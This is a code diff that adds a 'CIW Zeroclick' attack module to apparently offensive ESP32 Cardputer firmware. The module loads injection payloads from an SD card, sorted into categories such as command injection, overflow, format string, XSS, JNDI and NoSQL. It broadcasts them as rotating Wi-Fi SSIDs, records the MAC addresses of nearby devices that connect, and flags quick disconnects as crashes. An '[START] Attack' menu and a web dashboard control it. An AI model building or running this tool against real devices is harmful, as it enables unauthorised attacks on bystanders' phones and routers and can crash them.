+  // Stream-parse: read one JSON object at a time using a small buffer
+  // Each object is {"t":"...","c":"...","d":"..."} — fits in ~200 bytes
+  StaticJsonDocument<256> doc;
+  String line;
+  line.reserve(200);
+  bool inObj = false;
+  int braceDepth = 0;
+
+  while (f.available()) {
+    char ch = f.read();
+    if (ch == '{') {
+      inObj = true;
+      braceDepth = 1;
+      line = "{";
+    } else if (inObj) {
+      line += ch;
+      if (ch == '{') braceDepth++;
+      else if (ch == '}') {
+        braceDepth--;
+        if (braceDepth == 0) {
+          // Parse this single object
+          doc.clear();
+          DeserializationError err = deserializeJson(doc, line);
+          if (!err) {
+            const char* cat = doc["c"] | "";
+            uint8_t catIdx = ciwCatFromStr(cat);
+            if (catIdx != 0xFF && (catMask & (1 << catIdx))) {
+              CiwPayload p;
+              const char* text = doc["t"] | "";
+              strncpy(p.ssid, text, 32);
+              p.ssid[32] = '\0';
+              p.cat = catIdx;
+              ciwPayloads.push_back(p);
+            }
+          }
+          inObj = false;
+          line = "";
+        }
+      }
+    }
+  }
+  f.close();
+  Serial.println("CIW: Loaded " + String((int)ciwPayloads.size()) + " payloads");
+}
+
+// ── WiFi Event Handler ─────────────────────────────────────────────────────
+void ciwWifiEventHandler(WiFiEvent_t event, WiFiEventInfo_t info) {
+  if (event == ARDUINO_EVENT_WIFI_AP_STACONNECTED) {
+    if (ciwDevices && ciwDeviceCount < 10) {
+      uint8_t* m = info.wifi_ap_staconnected.mac;
+      memcpy(ciwDevices[ciwDeviceCount].mac, m, 6);
+      ciwDevices[ciwDeviceCount].connectTime = millis();
+      ciwDevices[ciwDeviceCount].payloadIdx = ciwCurrentIdx;
+      ciwDeviceCount++;
+      Serial.printf("CIW: Device connected %02X:%02X:%02X:%02X:%02X:%02X\n",
+        m[0], m[1], m[2], m[3], m[4], m[5]);
+    }
+  }
+  else if (event == ARDUINO_EVENT_WIFI_AP_STADISCONNECTED) {
+    uint8_t* m = info.wifi_ap_stadisconnected.mac;
+    // Find matching device
+    for (int i = 0; i < ciwDeviceCount; i++) {
+      if (memcmp(ciwDevices[i].mac, m, 6) == 0) {
+        unsigned long duration = millis() - ciwDevices[i].connectTime;
+        // Quick disconnect (<10s) = potential crash
+        if (duration < 10000 && ciwAlerts) {
+          int idx = ciwAlertHead;
+          memcpy(ciwAlerts[idx].mac, m, 6);
+          if (ciwDevices[i].payloadIdx < (int)ciwPayloads.size()) {
+            strncpy(ciwAlerts[idx].ssid, ciwPayloads[ciwDevices[i].payloadIdx].ssid, 32);
+            ciwAlerts[idx].ssid[32] = '\0';
+          }
+          ciwAlerts[idx].durationMs = duration;
+          ciwAlerts[idx].timestamp = millis();
+          ciwAlertHead = (ciwAlertHead + 1) % 10;
+          if (ciwAlertCount < 10) ciwAlertCount++;
+
+          if (soundOn) {
+            pixels.setPixelColor(0, pixels.Color(255, 0, 0));
+            pixels.show();
+          }
+          Serial.printf("CIW: ALERT crash detected! Duration: %lums\n", duration);
+        }
+        // Remove device (swap with last)
+        ciwDevices[i] = ciwDevices[ciwDeviceCount - 1];
+        ciwDeviceCount--;
+        break;
+      }
+    }
+  }
+}
+
+// ── Broadcast Engine ───────────────────────────────────────────────────────
+void ciwStartBroadcast() {
+  if (isCaptivePortalOn) {
+    stopCaptivePortal();
+    delay(100);
+  }
+
+  // Always reload with current category filter
+  ciwLoadPayloads(ciwSelectedCats);
+  if (ciwPayloads.empty()) {
+    Serial.println(F("CIW: No payloads to broadcast"));
+    return;
+  }
+
+  ciwWifiEventId = WiFi.onEvent(ciwWifiEventHandler);
+  WiFi.mode(WIFI_MODE_AP);
+  ciwCurrentIdx = 0;
+  WiFi.softAP(ciwPayloads[0].ssid, nullptr, 1, false, 10);
+  ciwLastRotation = millis();
+  ciwBroadcasting = true;
+  // Allocate tracking buffers only during broadcast
+  if (!ciwDevices) ciwDevices = (CiwDevice*)malloc(10 * sizeof(CiwDevice));
+  if (!ciwAlerts)  ciwAlerts  = (CiwAlert*)malloc(10 * sizeof(CiwAlert));
+  ciwDeviceCount = 0;
+  ciwAlertCount = 0;
+  ciwAlertHead = 0;
+
+  Serial.println("CIW: Broadcasting started - " + String((int)ciwPayloads.size()) + " payloads");
+  Serial.println("CIW: First SSID: " + String(ciwPayloads[0].ssid));
+}
+
+void ciwStopBroadcast() {
+  if (!ciwBroadcasting) return;
+  WiFi.softAPdisconnect(true);
+  WiFi.removeEvent(ciwWifiEventId);
+  ciwBroadcasting = false;
+  WiFi.mode(WIFI_MODE_APSTA);
+
+  // Free tracking buffers
+  free(ciwDevices); ciwDevices = nullptr;
+  free(ciwAlerts);  ciwAlerts  = nullptr;
+  ciwDeviceCount = 0;
+  ciwAlertCount = 0;
+
+  if (soundOn) {
+    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
+    pixels.show();
+  }
+
+  Serial.println(F("CIW: Broadcasting stopped"));
+}
+
+void ciwTickBroadcast() {
+  if (!ciwBroadcasting || ciwPayloads.empty()) return;
+  if (millis() - ciwLastRotation >= ciwRotationInterval) {
+    ciwCurrentIdx = (ciwCurrentIdx + 1) % (int)ciwPayloads.size();
+    WiFi.softAP(ciwPayloads[ciwCurrentIdx].ssid, nullptr, 1, false, 10);
+    ciwLastRotation = millis();
+    Serial.println("CIW: Rotated to [" + String(ciwCurrentIdx + 1) + "/" +
+      String((int)ciwPayloads.size()) + "] " + String(ciwPayloads[ciwCurrentIdx].ssid));
+  }
+}
+
+// ── Cardputer UI — Broadcast Loop ──────────────────────────────────────────
+void ciwBroadcastLoop() {
+  ciwStartBroadcast();
+  if (!ciwBroadcasting) return;
+
+  unsigned long lastDisplayUpdate = 0;
+  bool manualNav = false;
+  M5.Display.clear();
+  enterDebounce();
+
+  while (true) {
+    M5.update();
+    cardUpdate();
+    ciwTickBroadcast();
+
+    if (kp(KEY_BACKSPACE)) break;
+
+    // Manual next payload (;=prev, .=next like other menus)
+    if (kp('.')) {
+      ciwCurrentIdx = (ciwCurrentIdx + 1) % (int)ciwPayloads.size();
+      WiFi.softAP(ciwPayloads[ciwCurrentIdx].ssid, nullptr, 1, false, 10);
+      ciwLastRotation = millis();
+      manualNav = true;
+      lastDisplayUpdate = 0; // force redraw
+      delay(150);
+    } else if (kp(';')) {
+      ciwCurrentIdx = (ciwCurrentIdx - 1 + (int)ciwPayloads.size()) % (int)ciwPayloads.size();
+      WiFi.softAP(ciwPayloads[ciwCurrentIdx].ssid, nullptr, 1, false, 10);
+      ciwLastRotation = millis();
+      manualNav = true;
+      lastDisplayUpdate = 0;
+      delay(150);
+    }
+
+    // Update display every 500ms
+    if (millis() - lastDisplayUpdate > 500) {
+      lastDisplayUpdate = millis();
+      M5.Display.clear();
+      M5.Display.setTextSize(1.5);
+      M5.Display.setTextFont(1);
+      M5.Display.setCursor(5, 2);
+      M5.Display.setTextColor(TFT_GREEN);
+      M5.Display.println("CIW Broadcasting");
+      M5.Display.setTextColor(menuTextUnFocusedColor);
+      M5.Display.println();
+
+      String currentSsid = String(ciwPayloads[ciwCurrentIdx].ssid);
+      if (currentSsid.length() > 26) currentSsid = currentSsid.substring(0, 24) + "..";
+      M5.Display.println("SSID: " + currentSsid);
+
+      M5.Display.println("Payload: " + String(ciwCurrentIdx + 1) + "/" +
+        String((int)ciwPayloads.size()));
+
+      uint8_t catIdx = ciwPayloads[ciwCurrentIdx].cat;
+      if (catIdx < CIW_CAT_COUNT) {
+        M5.Display.println("Cat: " + String(ciwCatNames[catIdx]));
+      }
+
+      M5.Display.println("Devices: " + String(ciwDeviceCount));
+
+      if (ciwAlertCount > 0) {
+        M5.Display.setTextColor(TFT_RED);
+      }
+      M5.Display.println("Alerts: " + String(ciwAlertCount));
+      M5.Display.setTextColor(menuTextUnFocusedColor);
+
+      unsigned long elapsed = millis() - ciwLastRotation;
+      unsigned long remaining = 0;
+      if (elapsed < ciwRotationInterval) {
+        remaining = (ciwRotationInterval - elapsed) / 1000;
+      }
+      M5.Display.println("Next: " + String(remaining) + "s");
+
+      M5.Display.println();
+      M5.Display.setTextColor(TFT_DARKGREY);
+      M5.Display.println(";/. prev/next  BS stop");
+      M5.Display.display();
+    }
+
+    delay(10);
+  }
+
+  ciwStopBroadcast();
+  backDebounce();
+}
+
+// ── Cardputer UI — Category Selection ──────────────────────────────────────
+void ciwSelectCategories() {
+  // Total items: 14 categories + 2 actions (Select All, Deselect All)
+  const int totalItems = CIW_CAT_COUNT + 2;
+  int currentIndex = 0;
+  const int lineHeight = 12;
+  const int maxVisible = 11;
+  int startIdx = 0;
+
+  enterDebounce();
+
+  while (true) {
+    M5.Display.clear();
+    M5.Display.setTextSize(1.5);
+    M5.Display.setTextFont(1);
+
+    for (int i = 0; i < maxVisible; i++) {
+      int idx = startIdx + i;
+      if (idx >= totalItems) break;
+
+      String label;
+      if (idx < CIW_CAT_COUNT) {
+        bool selected = (ciwSelectedCats & (1 << idx)) != 0;
+        label = String(selected ? "[x] " : "[ ] ") + String(ciwCatNames[idx]);
+      } else if (idx == CIW_CAT_COUNT) {
+        label = ">>> Select All";
+      } else {
+        label = ">>> Deselect All";
+      }
+
+      if (idx == currentIndex) {
+        M5.Display.fillRect(0, i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
+        M5.Display.setTextColor(menuTextFocusedColor);
+      } else {
+        M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+      }
+      M5.Display.setCursor(5, i * lineHeight);
+      M5.Display.println(label);
+    }
+    M5.Display.display();
+
+    while (true) {
+      M5.update();
+      cardUpdate();
+
+      if (kp(';')) {
+        currentIndex = (currentIndex - 1 + totalItems) % totalItems;
+        if (currentIndex < startIdx) startIdx = currentIndex;
+        if (currentIndex >= startIdx + maxVisible) startIdx = currentIndex - maxVisible + 1;
+        delay(150);
+        break;
+      } else if (kp('.')) {
+        currentIndex = (currentIndex + 1) % totalItems;
+        if (currentIndex < startIdx) startIdx = currentIndex;
+        if (currentIndex >= startIdx + maxVisible) startIdx = currentIndex - maxVisible + 1;
+        delay(150);
+        break;
+      } else if (kp(KEY_ENTER)) {
+        if (currentIndex < CIW_CAT_COUNT) {
+          ciwSelectedCats ^= (1 << currentIndex);
+        } else if (currentIndex == CIW_CAT_COUNT) {
+          ciwSelectedCats = (1 << CIW_CAT_COUNT) - 1; // all bits on
+        } else {
+          ciwSelectedCats = 0;
+        }
+        delay(150);
+        break;
+      } else if (kp(KEY_BACKSPACE)) {
+        backDebounce();
+        return;
+      }
+      delay(10);
+    }
+  }
+}
+
+// ── Cardputer UI — View Devices ────────────────────────────────────────────
+void ciwViewDevices() {
+  M5.Display.clear();
+  M5.Display.setTextSize(1.5);
+  M5.Display.setTextFont(1);
+  M5.Display.setCursor(5, 2);
+  M5.Display.setTextColor(TFT_CYAN);
+  M5.Display.println("Connected Devices");
+  M5.Display.setTextColor(menuTextUnFocusedColor);
+  M5.Display.println();
+
+  if (ciwDeviceCount == 0) {
+    M5.Display.println("No devices recorded.");
+  } else {
+    int shown = min(ciwDeviceCount, 6);
+    for (int i = 0; i < shown; i++) {
+      char mac[18];
+      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
+        ciwDevices[i].mac[0], ciwDevices[i].mac[1], ciwDevices[i].mac[2],
+        ciwDevices[i].mac[3], ciwDevices[i].mac[4], ciwDevices[i].mac[5]);
+      M5.Display.println(mac);
+      if (ciwDevices[i].payloadIdx < (int)ciwPayloads.size()) {
+        String ssid = String(ciwPayloads[ciwDevices[i].payloadIdx].ssid);
+        if (ssid.length() > 20) ssid = ssid.substring(0, 18) + "..";
+        M5.Display.println("  " + ssid);
+      }
+    }
+    if (ciwDeviceCount > shown) {
+      M5.Display.println("..." + String(ciwDeviceCount - shown) + " more");
+    }
+  }
+
+  M5.Display.display();
+  enterDebounce();
+  while (true) {
+    M5.update();
+    cardUpdate();
+    if (kp(KEY_BACKSPACE)) { backDebounce(); break; }
+    if (kp(KEY_ENTER)) { enterDebounce(); break; }
+    delay(10);
+  }
+}
+
+// ── Cardputer UI — View Alerts ─────────────────────────────────────────────
+void ciwViewAlerts() {
+  M5.Display.clear();
+  M5.Display.setTextSize(1.5);
+  M5.Display.setTextFont(1);
+  M5.Display.setCursor(5, 2);
+  M5.Display.setTextColor(TFT_RED);
+  M5.Display.println("Crash Alerts");
+  M5.Display.setTextColor(menuTextUnFocusedColor);
+  M5.Display.println();
+
+  if (ciwAlertCount == 0) {
+    M5.Display.println("No alerts recorded.");
+  } else {
+    int shown = min(ciwAlertCount, 4);
+    for (int i = 0; i < shown; i++) {
+      int idx = (ciwAlertHead - ciwAlertCount + i + 10) % 10;
+      char mac[18];
+      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
+        ciwAlerts[idx].mac[0], ciwAlerts[idx].mac[1], ciwAlerts[idx].mac[2],
+        ciwAlerts[idx].mac[3], ciwAlerts[idx].mac[4], ciwAlerts[idx].mac[5]);
+      M5.Display.println(mac);
+      String ssid = String(ciwAlerts[idx].ssid);
+      if (ssid.length() > 22) ssid = ssid.substring(0, 20) + "..";
+      M5.Display.println("  " + ssid);
+      M5.Display.println("  " + String(ciwAlerts[idx].durationMs) + "ms");
+    }
+    if (ciwAlertCount > shown) {
+      M5.Display.println("..." + String(ciwAlertCount - shown) + " more");
+    }
+  }
+
+  M5.Display.display();
+  enterDebounce();
+  while (true) {
+    M5.update();
+    cardUpdate();
+    if (kp(KEY_BACKSPACE)) { backDebounce(); break; }
+    if (kp(KEY_ENTER)) { enterDebounce(); break; }
+    delay(10);
+  }
+}
+
+// ── Cardputer UI — Set Rotation Interval ───────────────────────────────────
+void ciwSetRotation() {
+  String input = "";
+  unsigned long lastKeyTime = 0;
+  const unsigned long debounceMs = 180;
+  enterDebounce();
+
+  while (true) {
+    // Draw static header once
+    M5.Display.clear();
+    M5.Display.setTextSize(1.5);
+    M5.Display.setTextFont(1);
+    M5.Display.setCursor(5, 2);
+    M5.Display.setTextColor(TFT_CYAN);
+    M5.Display.println("Rotation Interval (sec)");
+    M5.Display.setTextColor(menuTextUnFocusedColor);
+    M5.Display.println();
+    M5.Display.println("Current: " + String(ciwRotationInterval / 1000) + "s");
+    M5.Display.println("Type value (1-3600) + ENTER");
+    M5.Display.println();
+    M5.Display.setTextColor(TFT_GREEN);
+    M5.Display.print("> " + input + "_");
+    M5.Display.display();
+
+    while (true) {
+      M5.update();
+      cardUpdate();
+
+      if (millis() - lastKeyTime < debounceMs) { delay(10); continue; }
+
+      if (kp(KEY_BACKSPACE)) {
+        lastKeyTime = millis();
+        if (input.length() > 0) {
+          input.remove(input.length() - 1);
+        } else {
+          backDebounce();
+          return; // back to CIW menu
+        }
+        break; // redraw
+      } else if (kp(KEY_ENTER)) {
+        lastKeyTime = millis();
+        int val = input.toInt();
+        if (val >= 1 && val <= 3600) {
+          ciwRotationInterval = (unsigned long)val * 1000UL;
+        }
+        enterDebounce();
+        return; // back to CIW menu
+      } else {
+        bool typed = false;
+        for (char c = '0'; c <= '9'; c++) {
+          if (kp(c)) {
+            if (input.length() < 4) input += c;
+            lastKeyTime = millis();
+            typed = true;
+            break;
+          }
+        }
+        if (typed) break; // redraw
+      }
+      delay(10);
+    }
+  }
+}
+
+// ── Cardputer UI — Main CIW Menu ──────────────────────────────────────────
+void ciwZeroclickMenu() {
+  ciwEnsurePayloadsFile();
+
+  int currentIndex = 0;
+  const int lineHeight = 12;
+  const int maxVisible = 11;
+  enterDebounce();
+
+  while (true) {
+    // Build option labels dynamically each iteration
+    String labels[5];
+    labels[0] = "Select Categories";
+    labels[1] = ciwBroadcasting ? "[STOP] Attack" : "[START] Attack";
+    labels[2] = "View Devices (" + String(ciwDeviceCount) + ")";
+    labels[3] = "View Alerts (" + String(ciwAlertCount) + ")";
+    labels[4] = "Set Rotation (" + String(ciwRotationInterval / 1000) + "s)";
+    const int optCount = 5;
+
+    // Draw menu
+    M5.Display.clear();
+    M5.Display.setTextSize(1.5);
+    M5.Display.setTextFont(1);
+    M5.Display.setCursor(5, 0);
+    M5.Display.setTextColor(TFT_CYAN);
+    M5.Display.println("CIW Zeroclick");
+    M5.Display.setTextColor(menuTextUnFocusedColor);
+
+    for (int i = 0; i < optCount; i++) {
+      int y = (i + 1) * lineHeight;
+      if (i == currentIndex) {
+        M5.Display.fillRect(0, y, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
+        M5.Display.setTextColor(menuTextFocusedColor);
+      } else {
+        M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
+      }
+      M5.Display.setCursor(5, y);
+      M5.Display.println(labels[i]);
+    }
+    M5.Display.display();
+
+    // Input loop
+    bool redraw = false;
+    while (!redraw) {
+      M5.update();
+      cardUpdate();
+
+      if (kp(';')) {
+        currentIndex = (currentIndex - 1 + optCount) % optCount;
+        delay(150);
+        redraw = true;
+      } else if (kp('.')) {
+        currentIndex = (currentIndex + 1) % optCount;
+        delay(150);
+        redraw = true;
+      } else if (kp(KEY_ENTER)) {
+        delay(150);
+        switch (currentIndex) {
+          case 0: ciwSelectCategories(); break;
+          case 1:
+            if (ciwBroadcasting) ciwStopBroadcast();
+            else ciwBroadcastLoop();
+            break;
+          case 2: ciwViewDevices(); break;
+          case 3: ciwViewAlerts(); break;
+          case 4: ciwSetRotation(); break;
+        }
+        enterDebounce();
+        redraw = true; // return to this menu after action
+      } else if (kp(KEY_BACKSPACE)) {
+        if (ciwBroadcasting) ciwStopBroadcast();
+        ciwPayloads.clear();
+        ciwPayloads.shrink_to_fit();
+        inMenu = true;
+        return; // back to main menu
+      }
+      delay(10);
+    }
+  }
+}
+
+// ── Web Dashboard — HTML ───────────────────────────────────────────────────
+void handleCiwDashboard() {
+  if (!guardAdmin()) return;
+
+  static const char CIW_HTML[] PROGMEM = R"HTML(<!doctype html><html lang=en>
+<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
+<title>CIW Zeroclick</title>
+<style>
+:root{--bg:#0b1020;--card:rgba(255,255,255,.08);--txt:#e9eefc;--mut:#8892a6;--acc:#4c7dff;--grn:#22c55e;--red:#ef4444;--r:12px}
+*{box-sizing:border-box;margin:0}body{background:var(--bg);color:var(--txt);font-family:system-ui;padding:16px;max-width:700px;margin:auto}
+h1{font-size:20px;margin-bottom:16px}
+.card{background:var(--card);border-radius:var(--r);padding:14px;margin-bottom:12px}
+.card h2{font-size:15px;margin-bottom:8px;color:var(--acc)}
+.row{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px}
+button{background:var(--acc);color:#fff;border:none;padding:8px 16px;border-radius:8px;cursor:pointer;font-size:13px}
+button:hover{opacity:.85}button.stop{background:var(--red)}
+.cats{display:flex;flex-wrap:wrap;gap:6px}
+.cat{background:rgba(255,255,255,.06);padding:4px 10px;border-radius:6px;font-size:12px;cursor:pointer;border:1px solid rgba(255,255,255,.1)}
+.cat.on{border-color:var(--acc);background:rgba(76,125,255,.2)}
+.status{font-size:13px;color:var(--mut);line-height:1.6}
+.status .live{color:var(--grn);font-weight:700}
+.status .off{color:var(--red)}
+.alert-item{background:rgba(239,68,68,.1);border-left:3px solid var(--red);padding:8px;margin:4px 0;border-radius:0 8px 8px 0;font-size:12px}
+.dev-item{background:rgba(76,125,255,.1);padding:6px 8px;margin:3px 0;border-radius:6px;font-size:12px}
+a.back{color:var(--acc);text-decoration:none;font-size:13px}
+</style>
+<body>
+<a class=back href=/evil-menu>&larr; Admin</a>
+<h1>CIW Zeroclick Dashboard</h1>
+<div class=card><h2>Categories</h2><div class=cats id=cats></div></div>
+<div class=card><h2>Control</h2><div class=row>
+<button onclick=deploy() id=startBtn>Start Broadcast</button>
+<button class=stop onclick=stop()>Stop</button></div>
+<div class=status id=status>Loading...</div></div>
+<div class=card><h2>Devices</h2><div id=devices></div></div>
+<div class=card><h2>Alerts</h2><div id=alerts></div></div>
+<script>
+const cats=["wifi_cmd","wifi_overflow","wifi_fmt","wifi_probe","wifi_esc","wifi_serial","wifi_enc","wifi_chain","wifi_heap","wifi_xss","wifi_path","wifi_crlf","wifi_jndi","wifi_nosql"];
+let sel=new Set(cats);
+const ce=document.getElementById("cats");
+cats.forEach(c=>{const d=document.createElement("div");d.className="cat on";d.textContent=c.replace("wifi_","");d.onclick=()=>{sel.has(c)?sel.delete(c):sel.add(c);d.className="cat"+(sel.has(c)?" on":"")};ce.appendChild(d)});
+function deploy(){fetch("/api/ciw/deploy",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"cats="+[...sel].join(",")}).then(r=>r.json()).then(d=>{if(d.ok)poll();else alert(d.error||"Failed")})}
+function stop(){fetch("/api/ciw/stop",{method:"POST"}).then(r=>r.json())}
+function poll(){
+fetch("/api/ciw/status").then(r=>r.json()).then(d=>{
+const s=document.getElementById("status");
+if(d.broadcasting){s.innerHTML='<span class=live>BROADCASTING</span> | SSID: '+esc(d.ssid)+' | '+d.index+'/'+d.total+' | Devices: '+d.devices+' | Alerts: '+d.alerts;document.getElementById("startBtn").textContent="Broadcasting..."}
+else{s.innerHTML='<span class=off>STOPPED</span> | Devices: '+d.devices+' | Alerts: '+d.alerts;document.getElementById("startBtn").textContent="Start Broadcast"}
+});
+fetch("/api/ciw/devices").then(r=>r.json()).then(d=>{const el=document.getElementById("devices");el.innerHTML=d.length?d.map(x=>'<div class=dev-item>'+esc(x.mac)+' | '+esc(x.ssid)+'</div>').join(""):"<div style='color:var(--mut);font-size:13px'>No devices</div>"});
+fetch("/api/ciw/alerts").then(r=>r.json()).then(d=>{const el=document.getElementById("alerts");el.innerHTML=d.length?d.map(x=>'<div class=alert-item>'+esc(x.mac)+' | '+esc(x.ssid)+' | '+x.duration+'ms</div>').join(""):"<div style='color:var(--mut);font-size:13px'>No alerts</div>"});
+}
+function esc(s){const d=document.createElement("div");d.textContent=s;return d.innerHTML}
+poll();setInterval(poll,2000);
+</script></body></html>)HTML";
+
+  server.send_P(200, "text/html", CIW_HTML);
+}
+
+// ── Web API Handlers ───────────────────────────────────────────────────────
+void handleCiwPayloads() {
+  if (!guardAdmin()) return;
+
+  String catFilter = "";
+  if (server.hasArg("cat")) catFilter = server.arg("cat");
+
+  File f = SD.open("/evil/ciw/payloads.json", FILE_READ);
+  if (!f) {
+    server.send(404, "application/json", "{\"error\":\"payloads.json not found\"}");
+    return;
+  }
+
+  if (catFilter.length() == 0) {
+    // Stream entire file
+    server.streamFile(f, "application/json");
+    f.close();
+  } else {
+    // Filter by category — need to parse
+    size_t fSize = f.size();
+    DynamicJsonDocument doc(fSize + 1024);
+    deserializeJson(doc, f);
+    f.close();
+
+    DynamicJsonDocument result(fSize + 512);
+    JsonArray outArr = result.to<JsonArray>();
+
+    for (JsonObject obj : doc.as<JsonArray>()) {
+      const char* cat = obj["c"] | "";
+      if (catFilter == cat) {
+        outArr.add(obj);
+      }
+    }
+
+    String out;
+    serializeJson(result, out);
+    server.send(200, "application/json", out);
+  }
+}
+
+void handleCiwDeploy() {
+  if (!guardAdmin()) return;
+
+  String catsArg = "";
+  if (server.hasArg("cats")) catsArg = server.arg("cats");
+
+  // Parse categories into bitmask
+  uint16_t mask = 0;
+  if (catsArg.length() > 0) {
+    int start = 0;
+    while (start < (int)catsArg.length()) {
+      int comma = catsArg.indexOf(',', start);
+      if (comma < 0) comma = catsArg.length();
+      String cat = catsArg.substring(start, comma);
+      cat.trim();
+      uint8_t idx = ciwCatFromStr(cat.c_str());
+      if (idx < CIW_CAT_COUNT) mask |= (1 << idx);
+      start = comma + 1;
+    }
+  } else {
+    mask = 0xFFFF;
+  }
+
+  ciwSelectedCats = mask;
+  ciwLoadPayloads(mask);
+
+  if (ciwPayloads.empty()) {
+    server.send(400, "application/json", "{\"ok\":false,\"error\":\"No payloads for selected categories\"}");
+    return;
+  }
+
+  ciwStartBroadcast();
+  server.send(200, "application/json", "{\"ok\":true,\"count\":" + String((int)ciwPayloads.size()) + "}");
+}
+
+void handleCiwStop() {
+  if (!guardAdmin()) return;
+  ciwStopBroadcast();
+  server.send(200, "application/json", "{\"ok\":true}");
+}
+
+void handleCiwStatus() {
+  if (!guardAdmin()) return;
+
+  String json = "{\"broadcasting\":" + String(ciwBroadcasting ? "true" : "false");
+  if (ciwBroadcasting && !ciwPayloads.empty()) {
+    String ssid = String(ciwPayloads[ciwCurrentIdx].ssid);
+    // Escape JSON special chars in SSID
+    ssid.replace("\\", "\\\\");
+    ssid.replace("\"", "\\\"");
+    ssid.replace("\n", "\\n");
+    ssid.replace("\r", "\\r");
+    json += ",\"ssid\":\"" + ssid + "\"";
+    json += ",\"index\":" + String(ciwCurrentIdx + 1);
+    json += ",\"total\":" + String((int)ciwPayloads.size());
+  }
+  json += ",\"devices\":" + String(ciwDeviceCount);
+  json += ",\"alerts\":" + String(ciwAlertCount);
+  json += "}";
+
+  server.send(200, "application/json", json);
+}
+
+void handleCiwDevicesApi() {
+  if (!guardAdmin()) return;
+
+  String json = "[";
+  for (int i = 0; i < ciwDeviceCount; i++) {
+    if (i > 0) json += ",";
+    char mac[18];
+    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
+      ciwDevices[i].mac[0], ciwDevices[i].mac[1], ciwDevices[i].mac[2],
+      ciwDevices[i].mac[3], ciwDevices[i].mac[4], ciwDevices[i].mac[5]);
+    String ssid = "";
+    if (ciwDevices[i].payloadIdx < (int)ciwPayloads.size()) {
+      ssid = String(ciwPayloads[ciwDevices[i].payloadIdx].ssid);
+      ssid.replace("\\", "\\\\");
+      ssid.replace("\"", "\\\"");
+    }
+    json += "{\"mac\":\"" + String(mac) + "\",\"ssid\":\"" + ssid + "\"}";
+  }
+  json += "]";
+  server.send(200, "application/json", json);
+}
+
+void handleCiwAlertsApi() {
+  if (!guardAdmin()) return;
+
+  String json = "[";
+  for (int i = 0; i < ciwAlertCount; i++) {
+    if (i > 0) json += ",";
+    int idx = (ciwAlertHead - ciwAlertCount + i + 10) % 10;
+    char mac[18];
+    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
+      ciwAlerts[idx].mac[0], ciwAlerts[idx].mac[1], ciwAlerts[idx].mac[2],
+      ciwAlerts[idx].mac[3], ciwAlerts[idx].mac[4], ciwAlerts[idx].mac[5]);
+    String ssid = String(ciwAlerts[idx].ssid);
+    ssid.replace("\\", "\\\\");
+    ssid.replace("\"", "\\\"");
+    json += "{\"mac\":\"" + String(mac) + "\",\"ssid\":\"" + ssid +
+      "\",\"duration\":" + String(ciwAlerts[idx].durationMs) + "}";
+  }
+  json += "]";
+  server.send(200, "application/json", json);
 }
